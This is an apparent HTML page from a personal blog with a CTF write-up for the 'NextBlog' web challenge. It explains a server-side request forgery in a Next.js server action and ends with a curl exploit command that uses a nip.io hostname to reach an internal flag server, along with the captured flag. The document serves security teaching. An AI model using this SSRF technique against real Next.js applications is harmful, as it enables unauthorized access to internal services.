@@ -1,0 +1,80 @@
+<!doctype html><html lang=en><head><title>Web - NextBlog · z3r0s</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="z3r0s"><meta name=description content="
+  NextBlog - CTF Writeup
+  
+    
+    Link to heading
+  
+
+
+  Challenge Info
+  
+    
+    Link to heading
+  
+
+
+Name: NextBlog
+URL: https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io
+Category: Web
+Flag: CyCTF{F7oXj5sHY4xfvfrIo2x2pkbr4eIVEW3DoYSQe1WHsx_iffn39-InchEsJKhkGtnfg8VA60x6WfCvKRQjmHzftiAxx1TvnXF8FA}
+
+
+  Overview
+  
+    
+    Link to heading
+  
+
+A Next.js 16 blog application with a hidden flag server running on localhost:3001. The goal is to exploit a Server-Side Request Forgery (SSRF) vulnerability in a server action to reach the internal flag server."><meta name=keywords content="hackthebox,htb,ctf,writeup,cybersecurity,hacking,pentesting,redteam"><meta name=twitter:card content="summary"><meta name=twitter:title content="Web - NextBlog"><meta name=twitter:description content="NextBlog - CTF WriteupLink to headingChallenge InfoLink to headingName: NextBlog URL: https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io Category: Web Flag: CyCTF{F7oXj5sHY4xfvfrIo2x2pkbr4eIVEW3DoYSQe1WHsx_iffn39-InchEsJKhkGtnfg8VA60x6WfCvKRQjmHzftiAxx1TvnXF8FA} OverviewLink to headingA Next.js 16 blog application with a hidden flag server running on localhost:3001. The goal is to exploit a Server-Side Request Forgery (SSRF) vulnerability in a server action to reach the internal flag server."><meta property="og:url" content="https://z3r0s6.github.io/challenges/web-nextblog/"><meta property="og:site_name" content="z3r0s"><meta property="og:title" content="Web - NextBlog"><meta property="og:description" content="NextBlog - CTF WriteupLink to headingChallenge InfoLink to headingName: NextBlog URL: https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io Category: Web Flag: CyCTF{F7oXj5sHY4xfvfrIo2x2pkbr4eIVEW3DoYSQe1WHsx_iffn39-InchEsJKhkGtnfg8VA60x6WfCvKRQjmHzftiAxx1TvnXF8FA} OverviewLink to headingA Next.js 16 blog application with a hidden flag server running on localhost:3001. The goal is to exploit a Server-Side Request Forgery (SSRF) vulnerability in a server action to reach the internal flag server."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="challenges"><meta property="article:published_time" content="2026-05-10T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-10T00:00:00+00:00"><meta property="article:tag" content="Web"><meta property="article:tag" content="CyCTF-Luxor"><link rel=canonical href=https://z3r0s6.github.io/challenges/web-nextblog/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.f6b1b35a7b02521b25338f6cf58975f9980a6c12847763fe35a48307758cd1e7.css integrity="sha256-9rGzWnsCUhslM49s9Yl1+ZgKbBKEd2P+NaSDB3WM0ec=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css integrity="sha256-rUj0didZdIhb3APVJR482+FnjFSmP/dyN2sO0q3EaN0=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-dark"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://z3r0s6.github.io/>z3r0s
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Posts</a></li><li class=navigation-item><a class=navigation-link href=/about/>About</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://z3r0s6.github.io/challenges/web-nextblog/>Web - NextBlog</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-05-10T00:00:00Z>May 10, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+2-minute read</span></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/machineschallenges/>Machines&amp;Challenges</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/web/>Web</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/cyctf-luxor/>CyCTF-Luxor</a></span></div></div></header><div class=post-content><h1 id=nextblog---ctf-writeup>NextBlog - CTF Writeup
+<a class=heading-link href=#nextblog---ctf-writeup><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><h2 id=challenge-info>Challenge Info
+<a class=heading-link href=#challenge-info><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ul><li><strong>Name:</strong> NextBlog</li><li><strong>URL:</strong> <code>https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io</code></li><li><strong>Category:</strong> Web</li><li><strong>Flag:</strong> <code>CyCTF{F7oXj5sHY4xfvfrIo2x2pkbr4eIVEW3DoYSQe1WHsx_iffn39-InchEsJKhkGtnfg8VA60x6WfCvKRQjmHzftiAxx1TvnXF8FA}</code></li></ul><h2 id=overview>Overview
+<a class=heading-link href=#overview><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>A Next.js 16 blog application with a hidden flag server running on <code>localhost:3001</code>. The goal is to exploit a Server-Side Request Forgery (SSRF) vulnerability in a server action to reach the internal flag server.</p><h2 id=architecture>Architecture
+<a class=heading-link href=#architecture><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ul><li><strong>Next.js app</strong> on port 3000 (public)</li><li><strong>Flag server</strong> (<code>fserver.js</code>) on port 3001 (internal only, serves flag at <code>GET /flag</code>)</li><li>Both run in the same Docker container via <code>start.sh</code></li></ul><h2 id=vulnerability-analysis>Vulnerability Analysis
+<a class=heading-link href=#vulnerability-analysis><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=server-actions-appactionsts>Server Actions (<code>app/actions.ts</code>)
+<a class=heading-link href=#server-actions-appactionsts><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Two exported server actions handle image fetching:</p><p><strong><code>getImageAsDataUrl(imageName)</code></strong> - Has a regex filter and <code>/</code> prepend:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#ff7b72>let</span> safelink <span style=color:#ff7b72;font-weight:700>=</span> imageName.replace(<span style=color:#79c0ff>/(\.\/|\/\.|\.\\|\\\.|\.\.)/g</span>, <span style=color:#a5d6ff>&#39;&#39;</span>);
+</span></span><span style=display:flex><span><span style=color:#ff7b72>if</span> (safelink[<span style=color:#a5d6ff>0</span>] <span style=color:#ff7b72;font-weight:700>!==</span> <span style=color:#a5d6ff>&#39;/&#39;</span>) {
+</span></span><span style=display:flex><span>  safelink <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;/&#39;</span> <span style=color:#ff7b72;font-weight:700>+</span> safelink;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#ff7b72>const</span> { buffer, contentType } <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72>await</span> fetchImage(safelink)
+</span></span></code></pre></div><p><strong><code>fetchImage(imageName)</code></strong> - No filter, no prepend:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#ff7b72>const</span> imageUrl <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>`http://res.cloudinary.com</span><span style=color:#a5d6ff>${</span>imageName<span style=color:#a5d6ff>}</span><span style=color:#a5d6ff>`</span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>const</span> response <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#ff7b72>await</span> fetch(imageUrl)
+</span></span></code></pre></div><p>Both are exported from a <code>'use server'</code> file, making them callable directly as server actions from any client.</p><h3 id=key-constraints>Key Constraints
+<a class=heading-link href=#key-constraints><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><ol><li><code>getImageAsDataUrl</code> strips path traversal patterns (<code>./</code>, <code>/.</code>, <code>.\</code>, <code>\.</code>, <code>..</code>) and always prepends <code>/</code> if missing, making host manipulation impossible.</li><li><code>fetchImage</code> has <strong>no sanitization</strong> but Node.js <code>fetch()</code> rejects URLs containing userinfo (<code>@</code>), blocking the classic <code>http://host@evil/</code> SSRF trick.</li></ol><h2 id=exploitation>Exploitation
+<a class=heading-link href=#exploitation><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=finding-server-action-ids>Finding Server Action IDs
+<a class=heading-link href=#finding-server-action-ids><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Fetched the JavaScript chunk <code>b2ee5571784defbf.js</code> from the app, which contained:</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-javascript data-lang=javascript><span style=display:flex><span>createServerReference(<span style=color:#a5d6ff>&#34;40ec89965acdd40cb2b0164cce82150933f70274c4&#34;</span>, ..., <span style=color:#a5d6ff>&#34;getImageAsDataUrl&#34;</span>)
+</span></span><span style=display:flex><span>createServerReference(<span style=color:#a5d6ff>&#34;40d2dd1312f69711017b1742d0b5b19bb2e279f6aa&#34;</span>, ..., <span style=color:#a5d6ff>&#34;fetchImage&#34;</span>)
+</span></span></code></pre></div><h3 id=ssrf-via-dns-rebinding-nipio>SSRF via DNS Rebinding (nip.io)
+<a class=heading-link href=#ssrf-via-dns-rebinding-nipio><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Since <code>fetchImage</code> constructs the URL as <code>http://res.cloudinary.com${imageName}</code>, passing <code>.127.0.0.1.nip.io:3001/flag</code> creates:</p><pre tabindex=0><code>http://res.cloudinary.com.127.0.0.1.nip.io:3001/flag
+</code></pre><ul><li><strong>Host:</strong> <code>res.cloudinary.com.127.0.0.1.nip.io</code> (resolves to <code>127.0.0.1</code> via nip.io)</li><li><strong>Port:</strong> <code>3001</code></li><li><strong>Path:</strong> <code>/flag</code></li><li><strong>No userinfo</strong> - passes Node.js fetch validation</li></ul><h3 id=exploit-command>Exploit Command
+<a class=heading-link href=#exploit-command><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span>curl -s -X POST <span style=color:#a5d6ff>&#39;https://cyctf-luxor-cbaff7649acb-nextblog-0-0.chals.io/&#39;</span> <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span>  -H <span style=color:#a5d6ff>&#39;Content-Type: text/plain;charset=UTF-8&#39;</span> <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span>  -H <span style=color:#a5d6ff>&#39;Next-Action: 40d2dd1312f69711017b1742d0b5b19bb2e279f6aa&#39;</span> <span style=color:#79c0ff>\
+</span></span></span><span style=display:flex><span>  -d <span style=color:#a5d6ff>&#39;[ &#34;.127.0.0.1.nip.io:3001/flag&#34;]&#39;</span>
+</span></span></code></pre></div><p>The response contains the flag as a serialized Buffer, which decodes to the flag string.</p><h2 id=key-takeaways>Key Takeaways
+<a class=heading-link href=#key-takeaways><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ol><li><strong>Server actions are RPC endpoints</strong> - Any exported async function in a <code>'use server'</code> file can be called directly with arbitrary arguments, regardless of how the UI uses it.</li><li><strong>Filter bypass via unfiltered function</strong> - <code>getImageAsDataUrl</code> had sanitization, but <code>fetchImage</code> (also exposed) did not.</li><li><strong>DNS rebinding bypasses host restrictions</strong> - Services like <code>nip.io</code> resolve <code>*.127.0.0.1.nip.io</code> to <code>127.0.0.1</code>, allowing SSRF without URL userinfo (which <code>fetch()</code> rejects).</li></ol><p><span id=no-password style=display:none>Z3R0S_NO_PASSWORD_PLEASE</span></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2025 -
+2026
+z3r0s
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
